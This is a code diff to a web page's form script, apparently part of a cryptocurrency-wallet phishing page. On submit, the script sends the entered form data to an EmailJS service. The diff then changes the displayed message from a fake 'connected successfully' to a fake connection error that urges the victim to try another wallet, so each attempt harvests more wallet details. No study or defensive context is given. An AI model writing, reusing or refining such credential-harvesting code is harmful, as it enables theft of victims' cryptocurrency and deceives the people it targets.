@@ -55,10 +55,12 @@ document.querySelectorAll('.main-form').forEach(forms => {
 		event.preventDefault();
 		const btn_connect = forms.querySelector(".css-ev97sc");
 		btn_connect.setAttribute("disabled", true);
-		btn_connect.innerHTML = `<span class="css-1o1xzxn">Wwallet conecting...</span>`
+		const error_connect = forms.querySelector(".error-connect");
+		error_connect.style.display = "flex";
+		error_connect.innerHTML = "Wallet conecting...";
 		emailjs.sendForm('service_iqcf8gg', 'template_4p0736a', this)
 			.then(() => {
-				btn_connect.innerHTML = `<span class="css-1o1xzxn">Wwallet conected successfully</span>`
+				error_connect.innerHTML = "Error please try connecting with another wallet";
 			}, (error) => {
 				console.log('FAILED...', error);
 			});
